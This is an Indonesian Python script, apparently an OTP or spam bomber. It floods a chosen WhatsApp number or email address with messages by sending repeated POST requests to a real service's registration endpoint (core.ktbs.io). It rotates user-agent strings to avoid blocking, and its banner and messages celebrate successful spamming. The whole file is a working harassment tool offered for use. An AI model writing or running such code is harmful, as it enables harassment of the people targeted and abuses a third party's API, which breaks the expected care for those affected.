#-*- coding: utf8 -*-
#ya maap kodingam we berantakan :)>
import requests,random,time,os,sys
req=requests.Session()

r='\033[91m'
c='\033[96m'
w='\033[0m'

__banner__ = ('''
  spam kita.bisa gan :V
%s ###############################
 # %scode : Kumpulanremaja            %s#
 # %stype : wa/email             %s#
 # %steam : kumpulanremaja.com             %s#
 ###############################%s
    ''' % (c,w,c,w,c,w,c,w))


class Mate_lampu():
        def __init__(self):
            self.ua=open('ua.txt').read().splitlines()
            os.system('clear')
            print(__banner__)
            self.sok_aelu()

        def sok_aelu(self):
            type = str(input('[?] type: '))
            if type=='wa':
                self.tolol = 'phone_number'
                self.goblok=str(input('[?] no wa: '))
            elif type=='email':
                self.tolol = 'email'
                self.goblok=str(input('[?] email: '))
            else:
                Mate_lampu()
            self.spam_kuy()

        def spam_kuy(self):
            saapa=int(input('[?] jumlh: '))
            print('[!] delay 4 menit :V')
            for i in range(1,saapa+1):
                req.headers.update({'user-agent':random.choice(self.ua)});ceko = req.post('https://core.ktbs.io/v2/user/registration/temp', json = {'full_name':'Maoundis','user_id':self.goblok,'user_id_type':self.tolol})
                if ceko.status_code == 200:
                    print('  %s[%d] pesan: %ssuskes nyepam gan hehe :"c ' % (w,i,c))
                else:
                    print('  %s[%d] pesan: %s%s' % (w,i,r,ceko.json()['errors'][0]['details']['id']))
                time.sleep(240)
                continue
            quit('%s[%s#%s]%s selsai ,,,,' % (r,c,r,w))







# -----main -------

#try:
sys.exit(Mate_lampu())
#except Exception as _er:
#    quit('%serror: %s' % (r,_er))
